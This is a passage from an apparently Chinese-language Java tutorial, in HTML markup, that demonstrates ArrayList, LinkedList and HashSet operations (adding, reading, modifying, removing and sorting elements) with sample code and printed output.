class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">ArrayList&lt;Integer&gt; al = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>        al.add(<span class="hljs-number">23</span>);<br>        al.add(<span class="hljs-number">2312</span>);<br>        al.add(<span class="hljs-number">5435</span>);<br>        al.add(<span class="hljs-number">56</span>);<br>        al.add(<span class="hljs-number">45</span>);<br>        <span class="hljs-keyword">int</span> len = al.size(); <span class="hljs-comment">//获取总个数</span><br>        System.out.println(len);<br>        System.out.println(al);<br><br><span class="hljs-comment">//输出</span><br><span class="hljs-number">5</span><br>[<span class="hljs-number">23</span>, <span class="hljs-number">2312</span>, <span class="hljs-number">5435</span>, <span class="hljs-number">56</span>, <span class="hljs-number">45</span>]<br></code></pre></div></td></tr></table></figure><h5 id="1-1-2-输出方式"><a href="#1-1-2-输出方式" class="headerlink" title="1.1.2 输出方式"></a>1.1.2 输出方式</h5><p>访问 ArrayList 中的元素可以使用 get() 方法。此方法获取指定索引的元素。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//=================================================================</span><br><span class="hljs-comment">//下标输出</span><br>ArrayList&lt;Integer&gt; al = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>        al.add(<span class="hljs-number">23</span>);<br>        al.add(<span class="hljs-number">2312</span>);<br>        al.add(<span class="hljs-number">5435</span>);<br>        al.add(<span class="hljs-number">56</span>);<br>        al.add(<span class="hljs-number">45</span>);<br>        <span class="hljs-keyword">int</span> len = al.size();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len; ++i )&#123;<br>            System.out.println(al.get(i)); <br>        &#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">23</span><br><span class="hljs-number">2312</span><br><span class="hljs-number">5435</span><br><span class="hljs-number">56</span><br><span class="hljs-number">45</span><br><br><span class="hljs-comment">//=================================================================</span><br><span class="hljs-comment">//加强for</span><br>ArrayList&lt;Integer&gt; al = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>        al.add(<span class="hljs-number">23</span>);<br>        al.add(<span class="hljs-number">2312</span>);<br>        al.add(<span class="hljs-number">5435</span>);<br>        al.add(<span class="hljs-number">56</span>);<br>        al.add(<span class="hljs-number">45</span>);<br>        <span class="hljs-keyword">for</span>(Integer it : al)&#123;<br>            System.out.println(it);<br>        &#125;<br><br><span class="hljs-comment">//输出结果同上一样</span><br><br><span class="hljs-comment">//=================================================================</span><br><span class="hljs-comment">//迭代器</span><br>ArrayList&lt;Integer&gt; al = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>        al.add(<span class="hljs-number">23</span>);<br>        al.add(<span class="hljs-number">2312</span>);<br>        al.add(<span class="hljs-number">5435</span>);<br>        al.add(<span class="hljs-number">56</span>);<br>        al.add(<span class="hljs-number">45</span>);<br>        Iterator&lt;Integer&gt; it = al.iterator();<br>        <span class="hljs-keyword">while</span>(it.hasNext())&#123; <span class="hljs-comment">//hasNext()判断是否有下一个元素</span><br>            System.out.println(it.next()); <span class="hljs-comment">//next()返回下一个元素。</span><br>        &#125;<br><br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">23</span><br><span class="hljs-number">2312</span><br><span class="hljs-number">5435</span><br><span class="hljs-number">56</span><br><span class="hljs-number">45</span><br><br></code></pre></div></td></tr></table></figure><h5 id="1-1-3-修改元素"><a href="#1-1-3-修改元素" class="headerlink" title="1.1.3 修改元素"></a>1.1.3 修改元素</h5><p>使用 set() 方法。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">ArrayList&lt;Integer&gt; al = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>        al.add(<span class="hljs-number">23</span>);<br>        al.add(<span class="hljs-number">2312</span>);<br>        al.add(<span class="hljs-number">5435</span>);<br>        al.add(<span class="hljs-number">56</span>);<br>        al.add(<span class="hljs-number">45</span>);<br>        <span class="hljs-keyword">for</span>(Integer it : al)&#123;<br>            System.out.println(it);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;========================&quot;</span>);<br>        al.set(<span class="hljs-number">3</span>,<span class="hljs-number">22222222</span>); <span class="hljs-comment">// 第一个参数为索引位置，第二个为要修改的值。索引不能超过集合中数据的数量，即必须为有效索引，否则会报错。</span><br>        <span class="hljs-keyword">for</span>(Integer it : al)&#123;<br>            System.out.println(it);<br>        &#125;<br><br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">23</span><br><span class="hljs-number">2312</span><br><span class="hljs-number">5435</span><br><span class="hljs-number">56</span><br><span class="hljs-number">45</span><br>========================<br><span class="hljs-number">23</span><br><span class="hljs-number">2312</span><br><span class="hljs-number">5435</span><br><span class="hljs-number">22222222</span><br><span class="hljs-number">45</span><br></code></pre></div></td></tr></table></figure><h5 id="1-1-4-删除元素"><a href="#1-1-4-删除元素" class="headerlink" title="1.1.4 删除元素"></a>1.1.4 删除元素</h5><p>使用 remove() 方法。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">ArrayList&lt;Integer&gt; al = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>        al.add(<span class="hljs-number">23</span>);<br>        al.add(<span class="hljs-number">2312</span>);<br>        al.add(<span class="hljs-number">5435</span>);<br>        al.add(<span class="hljs-number">56</span>);<br>        al.add(<span class="hljs-number">45</span>);<br>        <span class="hljs-keyword">for</span>(Integer it : al)&#123;<br>            System.out.println(it);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;========================&quot;</span>);<br>        al.remove(<span class="hljs-number">2</span>); <span class="hljs-comment">//删除索引为2的元素</span><br>        <span class="hljs-keyword">for</span>(Integer it : al)&#123;<br>            System.out.println(it);<br>        &#125;<br><br><br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">23</span><br><span class="hljs-number">2312</span><br><span class="hljs-number">5435</span><br><span class="hljs-number">56</span><br><span class="hljs-number">45</span><br>========================<br><span class="hljs-number">23</span><br><span class="hljs-number">2312</span><br><span class="hljs-number">56</span><br><span class="hljs-number">45</span><br></code></pre></div></td></tr></table></figure><h5 id="1-1-5-排序"><a href="#1-1-5-排序" class="headerlink" title="1.1.5 排序"></a>1.1.5 排序</h5><p>Collections 类提供的sort() 方法可以对字符或数字列表进行排序。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">ArrayList&lt;Integer&gt; al = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>        al.add(<span class="hljs-number">23</span>);<br>        al.add(<span class="hljs-number">2312</span>);<br>        al.add(<span class="hljs-number">5435</span>);<br>        al.add(<span class="hljs-number">56</span>);<br>        al.add(<span class="hljs-number">45</span>);<br>        <span class="hljs-keyword">for</span>(Integer it : al)&#123;<br>            System.out.println(it);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;========================&quot;</span>);<br>        Collections.sort(al);<br>        <span class="hljs-keyword">for</span>(Integer it : al)&#123;<br>            System.out.println(it);<br>        &#125;<br><br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">23</span><br><span class="hljs-number">2312</span><br><span class="hljs-number">5435</span><br><span class="hljs-number">56</span><br><span class="hljs-number">45</span><br>========================<br><span class="hljs-number">23</span><br><span class="hljs-number">45</span><br><span class="hljs-number">56</span><br><span class="hljs-number">2312</span><br><span class="hljs-number">5435</span><br></code></pre></div></td></tr></table></figure><h4 id="1-2-LinkedList"><a href="#1-2-LinkedList" class="headerlink" title="1.2 LinkedList"></a>1.2 LinkedList</h4><p>与 ArrayList 相比，LinkedList 的增加和删除对操作效率更高，而查找和修改的操作效率较低。</p><p>LinkedList 继承了 AbstractSequentialList 类。实现了 Queue 接口，可作为队列使用。实现了 List 接口，可进行列表的相关操作。实现了 Deque 接口，可作为队列使用。实现了 Cloneable 接口，可实现克隆。实现了 java.io.Serializable 接口，即可支持序列化，能通过序列化去传输。</p><p>常用方法：</p><table><thead><tr><th align="center">方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">public boolean add(E e)</td><td align="center">链表末尾添加元素，返回是否成功，成功为 true，失败为 false。</td></tr><tr><td align="center">public void add(int index, E element)</td><td align="center">向指定位置插入元素。</td></tr><tr><td align="center">public boolean addAll(Collection c)</td><td align="center">将一个集合的所有元素添加到链表后面，返回是否成功，成功为 true，失败为 false。</td></tr><tr><td align="center">public boolean addAll(int index, Collection c)</td><td align="center">将一个集合的所有元素添加到链表的指定位置后面，返回是否成功，成功为 true，失败为 false。</td></tr><tr><td align="center">public void addFirst(E e)</td><td align="center">元素添加到头部。</td></tr><tr><td align="center">public void addLast(E e)</td><td align="center">元素添加到尾部。</td></tr><tr><td align="center">public boolean offer(E e)</td><td align="center">向链表末尾添加元素，返回是否成功，成功为 true，失败为 false。</td></tr><tr><td align="center">public boolean offerFirst(E e)</td><td align="center">头部插入元素，返回是否成功，成功为 true，失败为 false。</td></tr><tr><td align="center">public boolean offerLast(E e)</td><td align="center">尾部插入元素，返回是否成功，成功为 true，失败为 false。</td></tr><tr><td align="center">public void clear()</td><td align="center">清空链表。</td></tr><tr><td align="center">public E removeFirst()</td><td align="center">删除并返回第一个元素。</td></tr><tr><td align="center">public E removeLast()</td><td align="center">删除并返回最后一个元素。</td></tr><tr><td align="center">public boolean remove(Object o)</td><td align="center">删除某一元素，返回是否成功，成功为 true，失败为 false。</td></tr><tr><td align="center">public E remove(int index)</td><td align="center">删除指定位置的元素。</td></tr><tr><td align="center">public E poll()</td><td align="center">删除并返回第一个元素。</td></tr><tr><td align="center">public E remove()</td><td align="center">删除并返回第一个元素。</td></tr><tr><td align="center">public boolean contains(Object o)</td><td align="center">判断是否含有某一元素。</td></tr><tr><td align="center">public E get(int index)</td><td align="center">返回指定位置的元素。</td></tr><tr><td align="center">public E getFirst()</td><td align="center">返回第一个元素。</td></tr><tr><td align="center">public E getLast()</td><td align="center">返回最后一个元素。</td></tr><tr><td align="center">public int indexOf(Object o)</td><td align="center">查找指定元素从前往后第一次出现的索引。</td></tr><tr><td align="center">public int lastIndexOf(Object o)</td><td align="center">查找指定元素最后一次出现的索引。</td></tr><tr><td align="center">public E peek()</td><td align="center">返回第一个元素。</td></tr><tr><td align="center">public E element()</td><td align="center">返回第一个元素。</td></tr><tr><td align="center">public E peekFirst()</td><td align="center">返回头部元素。</td></tr><tr><td align="center">public E peekLast()</td><td align="center">返回尾部元素。</td></tr><tr><td align="center">public E set(int index, E element)</td><td align="center">设置指定位置的元素。</td></tr><tr><td align="center">public Object clone()</td><td align="center">克隆该列表。</td></tr><tr><td align="center">public Iterator descendingIterator()</td><td align="center">返回倒序迭代器。</td></tr><tr><td align="center">public int size()</td><td align="center">返回链表元素个数。</td></tr><tr><td align="center">public ListIterator listIterator(int index)</td><td align="center">返回从指定位置开始到末尾的迭代器。</td></tr><tr><td align="center">public Object[] toArray()</td><td align="center">返回一个由链表元素组成的数组。</td></tr><tr><td align="center">public T[] toArray(T[] a)</td><td align="center">返回一个由链表元素转换类型而成的数组。</td></tr></tbody></table><h5 id="1-2-1-添加元素"><a href="#1-2-1-添加元素" class="headerlink" title="1.2.1 添加元素"></a>1.2.1 添加元素</h5><blockquote><ol><li>头部添加元素</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">LinkedList&lt;Integer&gt; ll = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br>        ll.add(<span class="hljs-number">23</span>);<br>        ll.add(<span class="hljs-number">56</span>);<br>        ll.add(<span class="hljs-number">34</span>);<br>        ll.add(<span class="hljs-number">657</span>);<br>        ll.add(<span class="hljs-number">214</span>);<br>        <span class="hljs-keyword">for</span> ( <span class="hljs-keyword">int</span> it : ll)&#123;<br>            System.out.println(it);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;============================&quot;</span>);<br>        <br>        ll.addFirst(<span class="hljs-number">111111</span>);<br>        <br>        <span class="hljs-keyword">for</span> ( <span class="hljs-keyword">int</span> it : ll)&#123;<br>            System.out.println(it);<br>        &#125;<br><br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">23</span><br><span class="hljs-number">56</span><br><span class="hljs-number">34</span><br><span class="hljs-number">657</span><br><span class="hljs-number">214</span><br>============================<br><span class="hljs-number">111111</span><br><span class="hljs-number">23</span><br><span class="hljs-number">56</span><br><span class="hljs-number">34</span><br><span class="hljs-number">657</span><br><span class="hljs-number">214</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>尾部添加元素</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">LinkedList&lt;Integer&gt; ll = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br>        ll.add(<span class="hljs-number">23</span>);<br>        ll.add(<span class="hljs-number">56</span>);<br>        ll.add(<span class="hljs-number">34</span>);<br>        ll.add(<span class="hljs-number">657</span>);<br>        ll.add(<span class="hljs-number">214</span>);<br>        <span class="hljs-keyword">for</span> ( <span class="hljs-keyword">int</span> it : ll)&#123;<br>            System.out.println(it);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;============================&quot;</span>);<br>        <br>        ll.addLast(<span class="hljs-number">99999</span>);<br>        <br>        <span class="hljs-keyword">for</span> ( <span class="hljs-keyword">int</span> it : ll)&#123;<br>            System.out.println(it);<br>        &#125;<br><br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">23</span><br><span class="hljs-number">56</span><br><span class="hljs-number">34</span><br><span class="hljs-number">657</span><br><span class="hljs-number">214</span><br>============================<br><span class="hljs-number">23</span><br><span class="hljs-number">56</span><br><span class="hljs-number">34</span><br><span class="hljs-number">657</span><br><span class="hljs-number">214</span><br><span class="hljs-number">99999</span><br></code></pre></div></td></tr></table></figure><h5 id="1-2-2-删除元素"><a href="#1-2-2-删除元素" class="headerlink" title="1.2.2 删除元素"></a>1.2.2 删除元素</h5><blockquote><ol><li>头部删除元素</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">LinkedList&lt;Integer&gt; ll = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br>        ll.add(<span class="hljs-number">23</span>);<br>        ll.add(<span class="hljs-number">56</span>);<br>        ll.add(<span class="hljs-number">34</span>);<br>        ll.add(<span class="hljs-number">657</span>);<br>        ll.add(<span class="hljs-number">214</span>);<br>        <span class="hljs-keyword">for</span> ( <span class="hljs-keyword">int</span> it : ll)&#123;<br>            System.out.println(it);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;============================&quot;</span>);<br>        <br>        ll.removeFirst();<br>        <br>        <span class="hljs-keyword">for</span> ( <span class="hljs-keyword">int</span> it : ll)&#123;<br>            System.out.println(it);<br>        &#125;<br><br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">23</span><br><span class="hljs-number">56</span><br><span class="hljs-number">34</span><br><span class="hljs-number">657</span><br><span class="hljs-number">214</span><br>============================<br><span class="hljs-number">56</span><br><span class="hljs-number">34</span><br><span class="hljs-number">657</span><br><span class="hljs-number">214</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>尾部删除元素</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">LinkedList&lt;Integer&gt; ll = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br>        ll.add(<span class="hljs-number">23</span>);<br>        ll.add(<span class="hljs-number">56</span>);<br>        ll.add(<span class="hljs-number">34</span>);<br>        ll.add(<span class="hljs-number">657</span>);<br>        ll.add(<span class="hljs-number">214</span>);<br>        <span class="hljs-keyword">for</span> ( <span class="hljs-keyword">int</span> it : ll)&#123;<br>            System.out.println(it);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;============================&quot;</span>);<br><br>        ll.removeLast();<br><br>        <span class="hljs-keyword">for</span> ( <span class="hljs-keyword">int</span> it : ll)&#123;<br>            System.out.println(it);<br>        &#125;<br><br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">23</span><br><span class="hljs-number">56</span><br><span class="hljs-number">34</span><br><span class="hljs-number">657</span><br><span class="hljs-number">214</span><br>============================<br><span class="hljs-number">23</span><br><span class="hljs-number">56</span><br><span class="hljs-number">34</span><br><span class="hljs-number">657</span><br></code></pre></div></td></tr></table></figure><h5 id="1-2-3-获取元素"><a href="#1-2-3-获取元素" class="headerlink" title="1.2.3 获取元素"></a>1.2.3 获取元素</h5><blockquote><ol><li>头部获取元素</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">LinkedList&lt;Integer&gt; ll = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br>        ll.add(<span class="hljs-number">23</span>);<br>        ll.add(<span class="hljs-number">56</span>);<br>        ll.add(<span class="hljs-number">34</span>);<br>        ll.add(<span class="hljs-number">657</span>);<br>        ll.add(<span class="hljs-number">214</span>);<br>        <span class="hljs-keyword">for</span> ( <span class="hljs-keyword">int</span> it : ll)&#123;<br>            System.out.println(it);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;============================&quot;</span>);<br><br>        <span class="hljs-keyword">int</span> mi = ll.getFirst();<br><br>        System.out.println(mi);<br><br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">23</span><br><span class="hljs-number">56</span><br><span class="hljs-number">34</span><br><span class="hljs-number">657</span><br><span class="hljs-number">214</span><br>============================<br><span class="hljs-number">23</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>尾部获取元素</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">LinkedList&lt;Integer&gt; ll = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br>        ll.add(<span class="hljs-number">23</span>);<br>        ll.add(<span class="hljs-number">56</span>);<br>        ll.add(<span class="hljs-number">34</span>);<br>        ll.add(<span class="hljs-number">657</span>);<br>        ll.add(<span class="hljs-number">214</span>);<br>        <span class="hljs-keyword">for</span> ( <span class="hljs-keyword">int</span> it : ll)&#123;<br>            System.out.println(it);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;============================&quot;</span>);<br><br>        <span class="hljs-keyword">int</span> mi = ll.getLast();<br><br>        System.out.println(mi);<br><br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">23</span><br><span class="hljs-number">56</span><br><span class="hljs-number">34</span><br><span class="hljs-number">657</span><br><span class="hljs-number">214</span><br>============================<br><span class="hljs-number">214</span><br></code></pre></div></td></tr></table></figure><h4 id="1-3-Vector（遗留类）"><a href="#1-3-Vector（遗留类）" class="headerlink" title="1.3 Vector（遗留类）"></a>1.3 Vector（遗留类）</h4><p>一种线程安全的List实现。</p><h3 id="2-Set"><a href="#2-Set" class="headerlink" title="2.Set"></a>2.Set</h3><p><code>Set</code>用于存储不重复的元素集合。</p><ul><li>将元素添加进<code>Set&lt;E&gt;</code>：<code>boolean add(E e)</code></li><li>将元素从<code>Set&lt;E&gt;</code>删除：<code>boolean remove(Object e)</code></li><li>判断是否包含元素：<code>boolean contains(Object e)</code></li></ul><ul><li><code>HashSet</code>是无序的，因为它实现了<code>Set</code>接口，并没有实现<code>SortedSet</code>接口；</li><li><code>TreeSet</code>是有序的，因为它实现了<code>SortedSet</code>接口。</li></ul><h4 id="2-1-TreeSet"><a href="#2-1-TreeSet" class="headerlink" title="2.1 TreeSet"></a>2.1 TreeSet</h4><h4 id="2-2-HashSet"><a href="#2-2-HashSet" class="headerlink" title="2.2 HashSet"></a>2.2 HashSet</h4><p>基于哈希表实现，支持快速查找，但不支持有序性操作。并且失去了元素的插入顺序信息，也就是说使用 Iterator 遍历 HashSet 得到的结果是不确定的。<br>HashSet 基于 HashMap 来实现的，是一个不允许有重复元素的集合。允许有 null 值。是无序的。不是线程安全的。实现了 Set 接口。</p><h5 id="2-2-1-添加元素"><a href="#2-2-1-添加元素" class="headerlink" title="2.2.1 添加元素"></a>2.2.1 添加元素</h5><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">HashSet&lt;Integer&gt; hs = <span class="hljs-keyword">new</span> HashSet&lt;&gt;();<br>        hs.add(<span class="hljs-number">23</span>);<br>        hs.add(<span class="hljs-number">23</span>);<br>        hs.add(<span class="hljs-number">1213</span>);<br>        hs.add(<span class="hljs-number">567</span>);<br>        hs.add(<span class="hljs-number">654</span>);<br>        System.out.println(hs);<br><br><span class="hljs-comment">//输出结果</span><br>[<span class="hljs-number">23</span>, <span class="hljs-number">567</span>, <span class="hljs-number">1213</span>, <span class="hljs-number">654</span>]<br><span class="hljs-comment">//重复元素只会出现一次，因为集合中的每个元素都必须是唯一的。</span><br></code></pre></div></td></tr></table></figure><h5 id="2-2-2-删除元素"><a href="#2-2-2-删除元素" class="headerlink" title="2.2.2. 删除元素"></a>2.2.2. 删除元素</h5><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">HashSet&lt;Integer&gt; hs = <span class="hljs-keyword">new</span> HashSet&lt;&gt;();<br>        hs.add(<span class="hljs-number">23</span>);<br>        hs.add(<span class="hljs-number">23</span>);<br>        hs.add(<span 